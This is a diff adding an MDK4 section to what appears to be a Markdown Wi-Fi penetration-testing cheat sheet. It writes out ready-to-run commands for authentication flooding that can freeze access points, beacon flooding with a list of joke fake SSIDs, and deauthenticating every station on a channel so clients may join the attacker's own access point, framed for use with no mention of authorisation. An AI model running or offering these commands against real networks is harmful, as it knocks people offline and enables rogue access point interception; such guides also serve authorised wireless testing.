@@ -83,11 +83,88 @@ $ sudo aireplay-ng -0 0 -a [mac address] -c [mac address] wlan1
 
 ## MDK4
 
-... in work ...
+MDK4 is the successor to MDK3 (_but requires the Aircrack-ng_). It's an awesome penetration tool for Wi-Fi, but be careful that you don't jam your own connection.
 
 ```shell
-#
-$
+# show help (optional)
+$ sudo mdk4 --help
+
+# show detailed help (optional)
+$ sudo mdk4 --fullhelp
 ```
+
+### Authentication Denial-Of-Service (_Attack mode a_)
+
+With this attack mode you send too many authentication frames to all AP's. This can freeze or reset several AP's.
+
+```shell
+# show help for specific attack mode (optional)
+$ sudo mdk4 --help MODE a
+
+# normal attack on specific AP (valid client mac)
+$ sudo mdk4 wlan1 a -a [mac address] -m
+
+# intelligent attack on specific AP (valid client mac)
+$ sudo mdk4 wlan1 a -i [mac address] -m
+```
+
+### Beacon Flooding (_Attack mode b_)
+
+With this attack mode you generate fake AP's. You could push the real AP far back, and your AP among the first places.
+
+```shell
+# show help for specific attack mode (optional)
+$ sudo mdk4 --help MODE b
+
+# create fake AP's (without encryption but valid ap mac)
+$ sudo mdk4 wlan1 b -w n -m
+
+# create text file
+$ vim fake_ssid
+
+# create fake AP's from file (without encryption but valid ap mac)
+$ sudo mdk4 wlan1 b -w n -f fake_ssid -m
+```
+
+The content of the file `fake_ssid` (_feel free to change or add other content._).
+
+```
+WuTangLAN
+Wi-Fry Chicken
+Access Denied
+Virus.exe
+Connect or Die
+For Porn Use Only
+Missed Connections
+Bathroom Cam
+Big Busty Asians
+o==[]:::::::::::::::::::::::::>
+```
+
+### Deauthentication and Disassociation (_Attack mode d_)
+
+With this attack mode you deauthenticate stations from there access point. If you AP is ready (_and signal is strong_) they might connect to you afterwards.
+
+```shell
+# show help for specific attack mode (optional)
+$ sudo mdk4 --help MODE d
+
+# disconnect all stations from all AP's on channel 11
+$ sudo mdk4 wlan1 d -c 11
+```
+
+### other MDK4 attacks
+
+MDK4 offers 9 attack modules. Depending on your needs, take also a look at the other!
+
+- ATTACK MODE a: Authentication Denial-Of-Service
+- ATTACK MODE b: Beacon Flooding
+- ATTACK MODE d: Deauthentication and Disassociation  
+- ATTACK MODE e: EAPOL Start and Logoff Packet Injection
+- ATTACK MODE f: Packet Fuzzer
+- ATTACK MODE m: Michael Countermeasures Exploitation
+- ATTACK MODE p: SSID Probing and Bruteforcing
+- ATTACK MODE s: Attacks for IEEE 802.11s mesh networks
+- ATTACK MODE w: WIDS Confusion
 
 [Go Back](../readme.md)
